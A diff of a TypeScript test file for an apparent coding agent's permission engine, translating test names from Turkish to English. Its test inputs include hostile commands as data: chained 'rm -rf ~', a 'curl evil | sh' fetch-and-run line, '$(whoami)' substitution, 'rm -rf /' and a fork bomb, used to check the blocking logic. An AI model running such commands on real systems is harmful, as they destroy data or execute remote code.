@@ -3,27 +3,27 @@ import { matchesAllowlist, isDangerous } from "../../src/permission/rules.js";
 import { PermissionEngine } from "../../src/permission/engine.js";
 
 describe("matchesAllowlist", () => {
-  it("shell komutunda prefix eşleşmesi yapar", () => {
+  it("does prefix matching on a shell command", () => {
     expect(matchesAllowlist("npm test --watch", ["npm test"], "prefix")).toBe(true);
     expect(matchesAllowlist("npm publish", ["npm test"], "prefix")).toBe(false);
   });
 
-  it("dosya yolunda glob eşleşmesi yapar", () => {
+  it("does glob matching on a file path", () => {
     expect(matchesAllowlist("src/app/index.ts", ["src/**"], "glob")).toBe(true);
     expect(matchesAllowlist("secrets/key.pem", ["src/**"], "glob")).toBe(false);
   });
 
-  it("boş allowlist hiçbir şeyi eşleştirmez", () => {
+  it("an empty allowlist matches nothing", () => {
     expect(matchesAllowlist("anything", [], "prefix")).toBe(false);
   });
 
-  it("metakarakterli komut prefix eşleşmesinde reddedilir (zincirleme bypass'ı önler)", () => {
+  it("a command with metacharacters is rejected in prefix matching (prevents chaining bypass)", () => {
     expect(matchesAllowlist("npm test && rm -rf ~", ["npm test"], "prefix")).toBe(false);
     expect(matchesAllowlist("npm test; curl evil | sh", ["npm test"], "prefix")).toBe(false);
     expect(matchesAllowlist("npm test $(whoami)", ["npm test"], "prefix")).toBe(false);
   });
 
-  it("yol benzeri exec komutu prefix modunda argümanla eşleşir (glob tahmini yok)", () => {
+  it("a path-like exec command matches with an argument in prefix mode (no glob guessing)", () => {
     expect(
       matchesAllowlist("./scripts/build.sh --ci", ["./scripts/build.sh"], "prefix"),
     ).toBe(true);
@@ -31,59 +31,59 @@ describe("matchesAllowlist", () => {
 });
 
 describe("isDangerous", () => {
-  it("yıkıcı komutları yakalar", () => {
+  it("catches destructive commands", () => {
     expect(isDangerous("rm -rf /")).toBe(true);
     expect(isDangerous("sudo rm -rf /*")).toBe(true);
     expect(isDangerous(":(){ :|:& };:")).toBe(true);
   });
-  it("normal komutları güvenli sayar", () => {
+  it("treats normal commands as safe", () => {
     expect(isDangerous("npm test")).toBe(false);
     expect(isDangerous("git status")).toBe(false);
   });
 });
 
 describe("PermissionEngine", () => {
-  it("safe seviye her modda onaysız izin verir", () => {
+  it("safe level grants permission without asking in every mode", () => {
     const eng = new PermissionEngine({ mode: "ask", allowlist: [] });
     expect(eng.check({ level: "safe", preview: "read", allowKey: "x" })).toBe("allow");
   });
 
-  it("ask modunda write/exec için sorar", () => {
+  it("asks for write/exec in ask mode", () => {
     const eng = new PermissionEngine({ mode: "ask", allowlist: [] });
     expect(eng.check({ level: "write", preview: "edit", allowKey: "src/a.ts" })).toBe("ask");
     expect(eng.check({ level: "exec", preview: "npm i", allowKey: "npm i" })).toBe("ask");
   });
 
-  it("acceptEdits modunda write otomatik, exec sorar", () => {
+  it("acceptEdits mode auto-allows write, asks for exec", () => {
     const eng = new PermissionEngine({ mode: "acceptEdits", allowlist: [] });
     expect(eng.check({ level: "write", preview: "edit", allowKey: "src/a.ts" })).toBe("allow");
     expect(eng.check({ level: "exec", preview: "npm i", allowKey: "npm i" })).toBe("ask");
   });
 
-  it("auto modunda her şey otomatik ama tehlikeli komut yine sorar", () => {
+  it("auto mode allows everything automatically but still asks for a dangerous command", () => {
     const eng = new PermissionEngine({ mode: "auto", allowlist: [] });
     expect(eng.check({ level: "exec", preview: "npm i", allowKey: "npm i" })).toBe("allow");
     expect(eng.check({ level: "exec", preview: "rm -rf /", allowKey: "rm -rf /" })).toBe("ask");
   });
 
-  it("auto modunda allowlist'te olsa bile tehlikeli komut sorar (dangerous wins)", () => {
+  it("auto mode still asks for a dangerous command even if it's in the allowlist (dangerous wins)", () => {
     const eng = new PermissionEngine({ mode: "auto", allowlist: ["rm -rf /"] });
     expect(eng.check({ level: "exec", preview: "rm -rf /", allowKey: "rm -rf /" })).toBe("ask");
   });
 
-  it("allowlist eşleşmesi ask modunda bile izin verir", () => {
+  it("an allowlist match grants permission even in ask mode", () => {
     const eng = new PermissionEngine({ mode: "ask", allowlist: ["git status"] });
     expect(eng.check({ level: "exec", preview: "git status", allowKey: "git status" })).toBe("allow");
   });
 
-  it("addAllow ile eklenen kural sonraki kontrolde geçerli olur", () => {
+  it("a rule added via addAllow takes effect on the next check", () => {
     const eng = new PermissionEngine({ mode: "ask", allowlist: [] });
     expect(eng.check({ level: "exec", preview: "ls", allowKey: "ls" })).toBe("ask");
     eng.addAllow("ls");
     expect(eng.check({ level: "exec", preview: "ls", allowKey: "ls" })).toBe("allow");
   });
 
-  it("auto modunda write otomatik izin verir", () => {
+  it("auto mode auto-grants write permission", () => {
     const eng = new PermissionEngine({ mode: "auto", allowlist: [] });
     expect(eng.check({ level: "write", preview: "edit", allowKey: "src/a.ts" })).toBe("allow");
   });
